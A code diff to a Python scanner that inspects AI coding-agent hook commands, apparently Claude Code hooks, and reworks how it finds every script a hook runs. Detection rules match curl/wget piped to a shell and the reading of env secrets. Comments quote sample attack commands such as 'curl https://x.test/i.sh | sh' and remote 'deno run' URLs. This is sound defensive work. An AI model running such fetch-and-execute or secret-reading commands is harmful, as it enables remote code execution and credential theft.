@@ -1714,48 +1714,6 @@ SHELL_SYNTAX = re.compile(r"[$`*?\[]")
 # shell syntax at all, so a per-token filter waves it through. When a command contains one, nothing
 # in it is a path we resolved.
 SUBSTITUTION = re.compile(r"\$\(|`")
-# An interpreter decides what a token IS. Finding scripts by extension alone meant
-# `python3 .claude/hooks/tool` resolved to nothing: no script was read, no finding was raised, and
-# the hook passed `check` — the body of a file that runs on every tool call, never opened. Renaming
-# a script was enough. A file is a script because something runs it, not because of its name.
-#
-# By FAMILY, not by exact name. A set of literal names (`python3`, `node`) let `python3.12`,
-# `node20`, `tsx`, `ts-node` and `uv run` through with nothing read — the same bypass one rename
-# further along, which a sixth review measured as `([], [])`: nothing resolved AND nothing said.
-INLINE_BY_FAMILY: list[tuple[re.Pattern, tuple[str, ...]]] = [
-    (re.compile(r"(?:python|pypy)\d*(?:\.\d+)*"), ("-c",)),
-    (re.compile(r"node\d*"), ("-e", "--eval", "-p", "--print")),
-    (re.compile(r"deno"), ("eval",)),
-    (re.compile(r"bun"), ("-e",)),
-    (re.compile(r"ruby|perl"), ("-e",)),
-    (re.compile(r"php"), ("-r",)),
-    # A SHELL's inline flag is `-c` and only `-c`. Treating `-e` as inline for everything — it is
-    # `errexit` to a shell, `eval` to node — made `bash -e .claude/hooks/evil` resolve to nothing
-    # and raise nothing: a plausible-looking flag as an off switch.
-    (re.compile(r"sh|bash|zsh|fish|dash|ksh|csh|tcsh"), ("-c",)),
-    (re.compile(r"tsx|ts-node|lua|luajit|Rscript|osascript|env|uv|uvx|pipx"), ()),
-]
-INTERPRETER_NAME = re.compile("|".join(f"(?:{pat.pattern})" for pat, _ in INLINE_BY_FAMILY))
-SCRIPT_EXT = re.compile(r"\.(?:py|mjs|cjs|js|ts|sh)$")
-# Spaced operators only: `shlex.split("a;b")` returns one token, so this is a floor, not a fence —
-# every script in the command is still resolved, this just stops one interpreter's search for ITS
-# operand from running into the next command.
-SEPARATORS = {"&&", "||", ";", "|", "&", ";;", "(", ")"}
-# `uv run x`, `pipx run x`, `deno run x`: the first word is a subcommand, not the file. Reading it as
-# the operand resolved `<root>/run` — a file that never existed, reported missing, H8 *block*, with
-# the real script still unread. The invented path is the older mistake of this function, twice over.
-RUNNER_SUBCOMMAND = re.compile(r"uv|uvx|pipx|deno|bun|npx|bunx|npm|pnpm|yarn")
-SUBCOMMANDS = {"run", "exec", "dlx", "x", "task", "script"}
-
-
-def inline_flags(name: str) -> tuple[str, ...] | None:
-    """The flags that mean "the code is on this command line" for THIS interpreter, or None if the
-    name is not an interpreter at all."""
-    for pat, flags in INLINE_BY_FAMILY:
-        if pat.fullmatch(name):
-            return flags
-    return None
-
 HOOK_RULES: list[tuple[str, str, re.Pattern]] = [
     ("H1", "block", re.compile(r"(?:curl|wget)[^|\n]{0,200}\|\s*(?:sudo\s+)?(?:sh|bash|zsh)")),
     ("H2", "block", re.compile(r"(?:printenv|\benv\b|\$[A-Z_]*(?:TOKEN|SECRET|KEY|PASSWORD)[A-Z_]*)"
@@ -1797,7 +1755,47 @@ def hook_entries(root: Path) -> tuple[list[tuple[str, str, str]], list[tuple[str
     return out, unreadable
 
 
-def hook_scripts(root: Path, command: str) -> tuple[list[Path], list[tuple[str, str]]]:
+# WHICH FILE DOES THIS COMMAND RUN? Three reviews in two days answered it three ways, and each
+# answer was a list — of extensions, of flag names, of interpreter names. Eleven findings later the
+# lesson is the list itself: `python3 tool -c`, `bash -e evil`, `python3.12 tool`, `uv run tool`,
+# `node -r ok.js evil`, `python3 -W ignore tool`, a script named `env`. Every one walked past a
+# list, and every one came back as `([], [])` — nothing resolved AND nothing said.
+#
+# So the question is no longer "which token is the script", which needs an option table per
+# interpreter and loses whenever the table is short. It is **"which tokens are paths"**: a path has
+# a separator, or a script extension, or exists in the project. An option's VALUE (`ignore`, `run`,
+# `-W`) is none of those, a script is all three, and neither needs us to know the interpreter.
+# What interpreter names are still for: telling a bare program name from a file, carrying the inline
+# flag that means "the next token is code, not a file", and saying H11 when a command names one and
+# we resolved nothing. Not recognising an interpreter can no longer cause silence.
+INLINE_BY_FAMILY: list[tuple[re.Pattern, tuple[str, ...]]] = [
+    (re.compile(r"(?:python|pypy)[\d.]*"), ("-c",)),
+    (re.compile(r"node(?:js)?[\d.]*"), ("-e", "--eval", "-p", "--print")),
+    (re.compile(r"deno"), ("eval",)),
+    (re.compile(r"bun"), ("-e",)),
+    (re.compile(r"(?:ruby|perl)[\d.]*"), ("-e",)),
+    (re.compile(r"php[\d.]*"), ("-r",)),
+    # A SHELL's inline flag is `-c` and only `-c`. `-e` is `errexit` to a shell and `eval` to node,
+    # and treating it as inline for everything made `bash -e .claude/hooks/evil` an off switch
+    # written as a plausible flag.
+    (re.compile(r"(?:sh|bash|zsh|fish|dash|ksh|csh|tcsh)"), ("-c",)),
+    (re.compile(r"tsx|ts-node|lua|luajit|Rscript|osascript|env|uv|uvx|pipx|npx|bunx|npm|pnpm|yarn"), ()),
+]
+SCRIPT_EXT = re.compile(r"\.(?:py|mjs|cjs|js|ts|sh)$")
+# Spaced operators only: `shlex.split("a;b")` returns one token, so this is a floor, not a fence.
+SEPARATORS = {"&&", "||", ";", "|", "&", ";;", "(", ")"}
+
+
+def inline_flags(name: str) -> tuple[str, ...] | None:
+    """The flags that mean "the code is on this command line" for THIS interpreter, or None when the
+    name is not one we know. None no longer implies anything is safe — see hook_scripts."""
+    for pat, flags in INLINE_BY_FAMILY:
+        if pat.fullmatch(name):
+            return flags
+    return None
+
+
+def hook_scripts(root: Path, command: str, _depth: int = 0) -> tuple[list[Path], list[tuple[str, str]]]:
     """EVERY file a hook runs, not the first.
 
     The first version returned one, so `python3 good.py && python3 evil.py` was reviewed by reading
@@ -1820,56 +1818,73 @@ def hook_scripts(root: Path, command: str) -> tuple[list[Path], list[tuple[str, 
     unresolved: list[tuple[str, str]] = []
     seen: set[str] = set()
 
-    def add(token: str) -> None:
+    def add(token: str) -> bool:
         if SHELL_SYNTAX.search(token):
             # `$HOME/x.py`, `ev*.py`, `$(echo ev)il.py`: the shell resolves these and we do not.
             # Computing a path from the literal text invents a file, then reports it missing.
-            # One token reached by both passes below (an interpreter names it AND it ends in a
-            # script extension) is one finding, not two.
             if token not in seen:
                 seen.add(token)
                 unresolved.append((token, "expansion"))
-            return
+            return True      # accounted for: an expansion is a finding, not a gap as well
         path = Path(token) if Path(token).is_absolute() else root / token
         if path.as_posix() not in seen:
             seen.add(path.as_posix())
             out.append(path)
+        return True
 
-    for i, token in enumerate(tokens):
-        if "://" in token:
+    def is_path(token: str) -> bool:
+        """A path has a separator, or a script extension, or exists here. An option's value does not."""
+        return "/" in token or bool(SCRIPT_EXT.search(token)) or (root / token).is_file()
+
+    interp, resolved, inline, code_next, cur_flags, piped = False, False, False, None, (), False
+    for token in tokens:
+        if code_next is not None:
+            # The token after an inline flag IS the code. Reading it as a path invented
+            # `<root>/rm -rf /tmp/x`; ignoring it altogether left `bash -c 'python3 hooks/evil'`
+            # unread. So look inside it once, as a command in its own right.
+            if _depth == 0:
+                sub_out, sub_un = hook_scripts(root, token, _depth + 1)
+                here = root.resolve()
+                for q in sub_out:
+                    if not (q.is_file() and q.resolve().is_relative_to(here)):
+                        continue  # an argument, not a script: inside a quoted string we require both
+                    if q.as_posix() not in seen:
+                        seen.add(q.as_posix())
+                        out.append(q)
+                        resolved = True
+                unresolved.extend(u for u in sub_un if u[1] != "no-script")
+            code_next = None
+            continue
+        if token in SEPARATORS:                      # a new command: its own program, its own gap
+            if interp and not resolved and not inline and not piped:
+                unresolved.append((f"no file resolved in `{command.strip()[:80]}`", "no-script"))
+            interp, resolved, inline, cur_flags = False, False, False, ()
+            piped = token == "|"                     # `curl … | sh` feeds the shell on stdin
+            continue
+        if token in cur_flags:                       # THIS program's inline flag: code follows
+            code_next, inline = token, True
             continue
         flags = inline_flags(Path(token).name)
-        if flags is None:
+        if flags is not None and "/" not in token:   # a bare program name, not a file
+            interp, cur_flags = True, flags
             continue
-        # Options are read only until the first operand. Scanning "the first three tokens" for an
-        # inline flag meant `python3 .claude/hooks/tool -c` — the flag AFTER the script — counted as
-        # inline: the script still ran, and the check went quiet.
-        inline, operand = False, None
-        for cand in tokens[i + 1:]:
-            if cand in SEPARATORS:
-                break
-            if cand in SUBCOMMANDS and RUNNER_SUBCOMMAND.fullmatch(Path(token).name):
-                continue
-            if cand.startswith("-") or cand == "eval":
-                if cand in flags:
-                    # What follows is the code, not a file. `bash -c 'cmd' name` passes `name` as
-                    # $0, so there is no script there either — resolving it would invent one.
-                    inline = True
-                    break
-                continue
-            operand = cand
-            break
-        if operand is not None and "://" not in operand and inline_flags(Path(operand).name) is None:
-            add(operand)          # `env python3 x`: the operand IS an interpreter, so the next turn decides
-        elif not inline and operand is None:
-            # An interpreter with nothing we could resolve is not an inline command and not a
-            # reviewed script: it is a gap, and a gap says so rather than passing quietly.
-            unresolved.append((f"{token} — no file resolved in `{command.strip()[:80]}`", "no-script"))
-    for token in tokens:
-        # A script run directly, with no interpreter named: `./x.sh`, `.claude/hooks/x.py`.
-        # `curl https://x.test/i.sh | sh` ends in `.sh` and is not a path. A URL is a URL.
-        if "://" not in token and SCRIPT_EXT.search(token):
-            add(token)
+        if token.startswith("-"):
+            # An option, or its value, which `is_path` below declines on its own: `-W ignore`,
+            # `uv run`, `--loader x` — a value is not a separator, an extension or a file here.
+            continue
+        if "://" in token:
+            # `deno run https://host/x.ts` runs code off the network and H1 only catches a pipe —
+            # but a URL handed to `curl` or `wget` is H1's and H2's business, not a script of ours.
+            if interp:
+                unresolved.append((f"{token} — code from a URL", "computed"))
+                resolved = True
+            continue
+        if is_path(token):
+            resolved = add(token) or resolved
+    if interp and not resolved and not inline and not piped:
+        # A command that names an interpreter and resolved nothing is not an inline command and not
+        # a reviewed script: it is a gap, and a gap says so rather than passing quietly.
+        unresolved.append((f"no file resolved in `{command.strip()[:80]}`", "no-script"))
     return out, unresolved
 
 
